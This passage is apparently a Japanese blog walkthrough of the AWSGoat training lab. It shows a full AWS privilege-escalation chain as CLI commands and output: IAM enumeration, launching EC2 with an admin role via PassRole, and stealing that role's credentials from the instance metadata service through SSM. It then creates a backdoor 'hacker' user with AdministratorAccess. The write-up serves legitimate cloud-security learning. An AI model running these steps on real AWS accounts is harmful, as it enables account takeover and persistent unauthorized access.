　ポリシー「`aws-goat-instance-boundary-policy`」のポリシードキュメントを取得するためには、「`aws iam get-policy-version`」コマンドを利用します。  

このコマンドには引数には「`--version-id <バージョン ID>`」を指定する必要があり、このバージョン IDを取得するためには「`aws iam get-policy`」コマンドを実行します。  

出力結果の「`DefaultVersionId`」の値がバージョン IDとなります。

<div class="md-code" style="width:100%">

```
$ aws iam get-policy \
    --policy-arn arn:aws:iam::364300000000:policy/aws-goat-instance-boundary-policy
```

</div>

　「`"DefaultVersionId": "v1"`」を取得することができました。
「`v1`」を次に実行する「`aws iam get-policy-version`」コマンドに指定します。  

<div class="md-code" style="width:100%">

```json
{
    "Policy": {
        "PolicyName": "aws-goat-instance-boundary-policy",
        "PolicyId": "ANPAVJV7MGT3UAOC7EQR7",
        "Arn": "arn:aws:iam::364300000000:policy/aws-goat-instance-boundary-policy",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 0,
        "PermissionsBoundaryUsageCount": 1,
        "IsAttachable": true,
        "CreateDate": "2023-05-29T12:14:16+00:00",
        "UpdateDate": "2023-05-29T12:14:16+00:00",
        "Tags": []
    }
}
```

</div>

#### ポリシードキュメントを取得 (aws iam get-policy-version)

> コマンド説明：aws iam get-policy-version  
指定された管理ポリシーの指定されたバージョンに関する情報をポリシードキュメントを含めて取得します。

　ポリシー「`aws-goat-instance-boundary-policy`」のポリシードキュメントを取得します。  

　
ポリシードキュメントにはアクセスの許可・拒否の情報が記述されています。

<div class="md-code" style="width:100%">

```
$ aws iam get-policy-version \
    --policy-arn arn:aws:iam::364300000000:policy/aws-goat-instance-boundary-policy \
    --version-id v1
```

</div>

　この出力結果から以下の権限を持っていることを確認できました。  

- 「`iam:List`」「`iam:Get*`」 → 権限の強いポリシーを持ったロールを探索することが可能
- 「`ec2:RunInstance`」 → EC2を作成・起動することが可能
- 「`iam:PassRole`」 → （RunInstance に必要で）EC2に強い権限を持ったロールをアタッチ可能
- 「`ssm:*`」 → EC2インスタンス上で任意のコマンドを実行可能

　これらの情報から以下の手順を実施すれば、最終目標（AdministratorAccess 権限を持ったAWSユーザの作成）を達成させられそうです。

1. 新規EC2インスタンスを作成・起動する
1. 新規インスタンスに対して**強い権限**を持つロールを渡す
1. 新規インスタンスからクレデンシャルを取得する
1. 取得したクレデンシャルを使用してAWSユーザを作成する

<div class="md-code" style="width:100%">

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:List*",
                        "iam:Get*",
                        "iam:PassRole",
                        "iam:PutRole*",
                        "ssm:*",
                        "ssmmessages:*",
                        "ec2:RunInstances",
                        "ec2:Describe*",
                        "ecs:*",
                        "ecr:*",
                        "logs:CreateLogStream",
                        "logs:PutLogEvents"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "Pol1"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2023-05-29T12:14:16+00:00"
    }
}
```

</div>

### 強い権限を持ったロールを探す

　新規EC2インスタンスにアタッチするロールを探します。

#### 登録されているロール一覧を取得 (aws iam list-roles)

　ロールの一覧を表示し、権限の強いポリシーがアタッチされたロールを探します。  
（いくつかのロールが表示されますが、重要なロールだけを記載します。）

<div class="md-code" style="width:100%">

```
$ aws iam list-roles
```

</div>

　興味深いロール「`ec2Deployer-role`」を見つけることができました。  
（※ この結果だけでは強いロールかどうかを判断することはできません。実際の現場などでは一通りアタッチされらポリシーの権限を確認することになると思います。）  

<div class="md-code" style="width:100%">

```json
{
    "Path": "/",
    "RoleName": "ec2Deployer-role",
    "RoleId": "AROAVJV7MGT35ADFGYUUP",
    "Arn": "arn:aws:iam::364300000000:role/ec2Deployer-role",
    "CreateDate": "2023-05-29T12:14:16+00:00",
    "AssumeRolePolicyDocument": {
        "Version": "2008-10-17",
        "Statement": [
            {
                "Sid": "",
                "Effect": "Allow",
                "Principal": {
                    "Service": "ec2.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
}
```

</div>

#### ロールにアタッチされているポリシーを取得 (aws iam list-attached-role-policies)

　ロール「`ec2Deployer-role`」にアタッチされているポリシーを確認します。

<div class="md-code" style="width:100%">

```
$ aws iam list-attached-role-policies --role-name ec2Deployer-role
```

</div>

　ポリシー「`ec2DeployerAdmin-policy`」がアタッチされています。

<div class="md-code" style="width:100%">

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "ec2DeployerAdmin-policy",
            "PolicyArn": "arn:aws:iam::364300000000:policy/ec2DeployerAdmin-policy"
        }
    ]
}
```

</div>

#### ポリシーの詳細を確認 (aws iam get-policy-version)

　ポリシー「`ec2DeployerAdmin-policy`」のポリシードキュメントを確認します。

<div class="md-code" style="width:100%">

```
$ aws iam get-policy-version \
    --policy-arn arn:aws:iam::364300000000:policy/ec2DeployerAdmin-policy \
    --version-id v1
```

</div>

　<span style="color: #ff0000">このポリシーは「すべてのリソースに対してすべてのアクションを実行できるポリシー」のようです。</span>

<div class="md-code" style="width:100%">

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "Policy1"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2023-05-29T12:14:16+00:00"
    }
}
```

</div>

#### インスタンスプロファイルの探索 (aws iam list-instance-profiles)

　インスタンスプロファイルの一覧を表示し、ロール「`ec2Deployer-role`」が含まれているインスタンスプロファイルを探します。

<div class="md-code" style="width:100%">

```bash
$ aws iam list-instance-profiles
```

</div>

　ロール「`ec2Deployer-role`」を持っているインスタンスプロファイル「**`ec2Deployer`**」を見つけることができました。

<div class="md-code" style="width:100%">

```json
{
    "InstanceProfiles": [
        {
            "Path": "/",
            "InstanceProfileName": "ec2Deployer",
            "InstanceProfileId": "AIPAVJV7MGT3UHRAPLDQH",
            "Arn": "arn:aws:iam::364300000000:instance-profile/ec2Deployer",
            "CreateDate": "2023-05-29T12:14:17+00:00",
            "Roles": [
                {
                    "Path": "/",
                    "RoleName": "ec2Deployer-role",
                    "RoleId": "AROAVJV7MGT35ADFGYUUP",
                    "Arn": "arn:aws:iam::364300000000:role/ec2Deployer-role",
                    "CreateDate": "2023-05-29T12:14:16+00:00",
                    "AssumeRolePolicyDocument": {
                        "Version": "2008-10-17",
                        "Statement": [
                            {
                                "Sid": "",
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "ec2.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}
```

</div>

　無事、新規EC2インスタンスにアタッチするロールを見つけることができたので、インスタンスの作成を実施していきます。

### EC2インスタンスを作成する

　EC2インスタンスを作成するには以下の情報が必要です。

| EC2起動に必要なパラメータ | 値 |
| --- | --- |
| AMI ID  | ami-(不明) |
| インスタンスプロファイル名 | ec2Deployer |
| サブネット ID | subnet-(不明) |
| セキュリティグループ ID | sg-(不明) |

#### Amazon Linux 2 AMI のIDを取得 （aws ec2 describe-images）

　新規EC2インスタンスは Amazon Linux 2 で起動させることにします。そのために AMI ID を取得します。

<div class="md-code" style="width:100%">

```
$ aws ec2 describe-images --owners amazon \
    --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' \
    --query 'reverse(sort_by(Images,&CreationDate))[:1].{id:ImageId,date:CreationDate}'
```

</div>

　AMI ID「`ami-0f792671d5139f458`」を取得することができました。

<div class="md-code" style="width:100%">

```json
[
    {
        "id": "ami-0f792671d5139f458",
        "date": "2023-05-16T22:51:19.000Z"
    }
]
```

</div>

| EC2起動に必要なパラメータ | 値 |
| --- | --- |
| AMI ID  | <span style="color: #ff0000">ami-0f792671d5139f458</span> |
| インスタンスプロファイル名 | ec2Deployer |
| サブネット ID | subnet-(不明) |
| セキュリティグループ ID | sg-(不明) |

#### サブネット IDを取得 （aws ec2 describe-subnets）

　次はサブネットの情報を取得します。

<div class="md-code" style="width:100%">

```
$ aws ec2 describe-subnets
```

</div>

　サブネット ID「`subnet-0448624xxxxxxxxxx`」を取得することができました。このサブネットにEC2を起動することにします。

　利用可能なセキュリティグループを判別するため VPC ID「`vpc-0ed391xxxxxxxxxxx`」もメモしておきます。

<div class="md-code" style="width:100%">

```json
{
    "Subnets": [
        {
            "AvailabilityZone": "us-east-1a",
            "AvailabilityZoneId": "use1-az2",
            "AvailableIpAddressCount": 248,
            "CidrBlock": "10.0.1.0/24",
            "DefaultForAz": false,
            "MapPublicIpOnLaunch": true,
            "MapCustomerOwnedIpOnLaunch": false,
            "State": "available",
            "SubnetId": "subnet-0448624xxxxxxxxxx",
            "VpcId": "vpc-0ed391xxxxxxxxxxx",
            "OwnerId": "364300000000",
            "AssignIpv6AddressOnCreation": false,
            "Ipv6CidrBlockAssociationSet": [],
            "SubnetArn": "arn:aws:ec2:us-east-1:364300000000:subnet/subnet-0448624xxxxxxxxxx",
            "EnableDns64": false,
            "Ipv6Native": false,
            "PrivateDnsNameOptionsOnLaunch": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            }
        }
    ]
}
```

</div>

| EC2起動に必要なパラメータ | 値 |
| --- | --- |
| AMI ID  | ami-0f792671d5139f458 |
| インスタンスプロファイル名 | ec2Deployer |
| サブネット ID | <span style="color: #ff0000">subnet-0448624xxxxxxxxxx</span> |
| セキュリティグループ ID | sg-(不明) |

#### セキュリティグループを取得 (aws ec2 describe-security-groups)

　VPC ID「`vpc-0ed391xxxxxxxxxxx`」のセキュリティグループを探します。  

<div class="md-code" style="width:100%">

```
$ aws ec2 describe-security-groups
```

</div>

　セキュリティグループ ID「`sg-0d12e6bbxxxxxxxxx`」を取得できました。  

<div class="md-code" style="width:100%">

```json
{
    "SecurityGroups": [
        {
            "Description": "SG for cluster created from terraform",
            "GroupName": "ECS-SG",
            "IpPermissions": [
                {
                    "FromPort": 0,
                    "IpProtocol": "tcp",
                    "IpRanges": [],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "ToPort": 65535,
                    "UserIdGroupPairs": [
                        {
                            "GroupId": "sg-0d12e6bbxxxxxxxxx",
                            "UserId": "364300000000"
                        }
                    ]
                }
            ],
            "OwnerId": "364300000000",
            "GroupId": "sg-0602041b3c7afacd3",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "VpcId": "vpc-0ed391xxxxxxxxxxx"
        }
    ]
}
```

</div>

| EC2起動に必要なパラメータ | 値 |
| --- | --- |
| AMI ID  | ami-0f792671d5139f458 |
| インスタンスプロファイル名 | ec2Deployer |
| サブネット ID | subnet-0448624xxxxxxxxxx |
| セキュリティグループ ID | <span style="color: #ff0000">sg-0d12e6bbxxxxxxxxx</span> |

　EC2インスタンスの作成に必要な情報が集まったので、新規インスタンスを起動します。  

#### EC2インスタンスの起動 （aws ec2 run-instances）

<div class="md-code" style="width:100%">

```
InstanceId i-0f7f96d4e98xxxxx
```

</div>

　取得した「サブネットID」、「AMI ID」「インスタンスプロファイル」「セキュリティグループ ID」をコマンドの引数にしてEC2インスタンスを起動します。

<div class="md-code" style="width:100%">

```
$ aws ec2 run-instances \
    --subnet-id subnet-0448624xxxxxxxxxx \
    --image-id ami-0f792671d5139f458 \
    --iam-instance-profile Name=ec2Deployer \
    --instance-type t2.micro \
    --security-group-ids "sg-0d12e6bbxxxxxxxxx"
```

</div>

　以下のように出力されたら正常にEC2インストタンスが作成されています。  

　インスタンス ID（`i-0f7f96d4e98xxxxx`）は後々利用しますので、メモしておきます。  

<div class="md-code" style="width:100%">

```json
{
    "Groups": [],
    "Instances": [
        {
            "AmiLaunchIndex": 0,
            "ImageId": "ami-0f792671d5139f458",
            "InstanceId": "i-0f7f96d4e98xxxxx",
            "InstanceType": "t2.micro",
            "LaunchTime": "2023-05-29T14:29:33+00:00",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "us-east-1a",
                "GroupName": "",
                "Tenancy": "default"
            },
            // (省略)
        }
    ],
    "OwnerId": "364300000000",
    "ReservationId": "r-082ff278135b2d082"
}
```

</div>


AWS コンソール上でも作成したEC2インスタンスを確認することができました。  

[f:id:motikan2010:20230531020129p:plain:w700]

### ロールの一時的なアクセス資格を取得

作成したEC2内のメタデータサービスにアクセスして、クレデンシャルを取得します。  

#### EC2内でコマンドを実行 (aws ssm send-command)

　「`ec2Deployer-role`」の一時的なアクセス資格を取得します。

　新規EC2インスタンス内で以下のコマンドを実行することで一時的なアクセス資格を取得することができます。  
`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2Deployer-role/`

　インスタンス内でコマンドを実行するために以下のコマンドを実行します。

<div class="md-code" style="width:100%">

```
$ aws ssm send-command \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2Deployer-role/"]' \
    --targets "Key=instanceids,Values=i-0f7f96d4e98xxxxx" \
    --comment "aws cli 1"
```

</div>

　インスタンス内で実行したコマンドの結果を取得するために「`CommandId`」の値（`1d062099-91ba-4520-bcf1-b0e42f26d26e`）を取得します。

<div class="md-code" style="width:100%">

```json
{
    "Command": {
        "CommandId": "1d062099-91ba-4520-bcf1-b0e42f26d26e",
        "DocumentName": "AWS-RunShellScript",
        "DocumentVersion": "$DEFAULT",
        "Comment": "aws cli 1",
        "ExpiresAfter": "2023-05-30T01:34:17.094000+09:00",
        "Parameters": {
            "commands": [
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2Deployer-role/"
            ]
        },
        //（省略）
    }
}
```

</div>

#### コマンドの結果を取得 (aws ssm get-command-invocation)

　前に実行したコマンドの結果を取得します。

<div class="md-code" style="width:100%">

```
$ aws ssm get-command-invocation \
    --command-id "1d062099-91ba-4520-bcf1-b0e42f26d26e" \
    --instance-id "i-0f7f96d4e98xxxxx"
```

</div>

　結果にクレデンシャルが含まれています。  

<div class="md-code" style="width:100%">

```json
{
    "CommandId": "1d062099-91ba-4520-bcf1-b0e42f26d26e",
    "InstanceId": "i-0f7f96d4e98xxxxx",
    "Comment": "aws cli 1",
    "DocumentName": "AWS-RunShellScript",
    "DocumentVersion": "$DEFAULT",
    "PluginName": "aws:runShellScript",
    "ResponseCode": 0,
    "ExecutionStartDateTime": "2023-05-29T14:34:17.844Z",
    "ExecutionElapsedTime": "PT0.053S",
    "ExecutionEndDateTime": "2023-05-29T14:34:17.844Z",
    "Status": "Success",
    "StatusDetails": "Success",
    "StandardOutputContent": "{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2023-05-29T14:29:38Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"ASIAVJXXXXXXXXXXXXXX\",\n  \"SecretAccessKey\" : \"vtHr/KJqQ1+miLKhxxxxxxxxxxxxxxxxxxxxxxxx\",\n  \"Token\" : \"IQoJb3JpZ2luX2VjED8aCXVzLWVhc3QtMSJGMEQCIxxxxx\",\n  \"Expiration\" : \"2023-05-29T21:04:36Z\"\n}",
    "StandardOutputUrl": "",
    "StandardErrorContent": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  1566  100  1566    0     0   509k      0 --:--:-- --:--:-- --:--:--  509k\n",
    "StandardErrorUrl": "",
    "CloudWatchOutputConfig": {
        "CloudWatchLogGroupName": "",
        "CloudWatchOutputEnabled": false
    }
}
```

</div>

#### クレデンシャルの有効性を確認 (aws sts get-caller-identity)

　取得したクレデンシャルを設定し、有効であるかを確認します。

<div class="md-code" style="width:100%">

```sh
export AWS_ACCESS_KEY_ID=ASIAVJXXXXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=vtHr/KJqQ1+miLKhxxxxxxxxxxxxxxxxxxxxxxxx
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjED8aCXVzLWVhc3QtMSJGMEQCIxxxxx
```

</div>

　このクレデンシャルを持つIAMユーザーまたはロールに関する詳細が返されることから、取得できたクレデンシャルが有効であることが確認できました。

<div class="md-code" style="width:100%">

```
$ aws sts get-caller-identity
```

</div>

<div class="md-code" style="width:100%">

```json
{
    "UserId": "AROAVJV7MGT35ADFGYUUP:i-0f7f96d4e98xxxxx",
    "Account": "364300000000",
    "Arn": "arn:aws:sts::364300000000:assumed-role/ec2Deployer-role/i-0f7f96d4e98xxxxx"
}
```

</div>

### バックドアAWSユーザの作成

　とうとう最後のフェーズです。

　取得したクレデンシャルを利用しバックドアAWSユーザを追加します。さらにそのユーザに対して管理者権限を付与しましょう。  

　ログインできるようにパスワードの設定を行います。AWS CLI で利用できるように当ユーザのクレデンシャルの発行も行います。  

#### AWSユーザの作成  （aws iam create-user）

　取得したクレデンシャルを利用して、最終目標であるバックドアAWSユーザを追加を行います。  

　「`hacker`」という名のAWSユーザ追加します。   

<div class="md-code" style="width:100%">

```
$ aws iam create-user --user-name hacker
```

</div>

<div class="md-code" style="width:100%">

```json
{
    "User": {
        "Path": "/",
        "UserName": "hacker",
        "UserId": "AIDAVJV7MGT3RYW4XXXXX",
        "Arn": "arn:aws:iam::364300000000:user/hacker",
        "CreateDate": "2023-05-29T14:37:50+00:00"
    }
}
```

</div>

####  ユーザにポリシーを付与 (aws iam attach-user-policy)

　AWSユーザ「`hacker`」にポリシー「`AdministratorAccess `」を追加します。  

<div class="md-code" style="width:100%">

```
$ aws iam attach-user-policy \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
    --user-name hacker
```

</div>

　これで管理者アカウントを外部から追加できたことになります！！

####  ログイン時の認証情報を作成 (aws iam create-login-profile)

　AWSユーザ「`hacker`」にパスワードを設定します。  

<div class="md-code" style="width:100%">

```
$ aws iam create-login-profile \
    --user-name hacker \
    --password hackerPassword@123
```

</div>

<div class="md-code" style="width:100%">

```json
{
    "LoginProfile": {
        "UserName": "hacker",
        "CreateDate": "2023-05-29T14:38:47+00:00",
        "PasswordResetRequired": false
    }
}
```

</div>

#### APIのクレデンシャルを作成 (aws iam create-access-key)

　AWSユーザ「`hacker`」のクレデンシャルを作成します。  

<div class="md-code" style="width:100%">

```
$ aws iam create-access-key --user-name hacker
```

</div>

<div class="md-code" style="width:100%">

```json
{
    "AccessKey": {
        "UserName": "hacker",
        "AccessKeyId": "AKIAVJVXXXXXXXXXXXXX",
        "Status": "Active",
        "SecretAccessKey": "5+VAgyEemxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "CreateDate": "2023-05-29T14:38:52+00:00"
    }
}
```

</div>

　AWSコンソール上でもこのAWSユーザ追加されていることが確認できました。  

[f:id:motikan2010:20230531015828p:plain:w700]

## 後片付け

　学習中に追加したリソースを先に削除し、最後に Terraform で追加したリソースを削除するといい感じがします。  

1.  EC2の「`i-0f7f96d4e98xxxxx`」を削除
2.  IAMユーザの「`hacker`」を削除
3. GitHub Actionで「Terraform Destroy」を実行
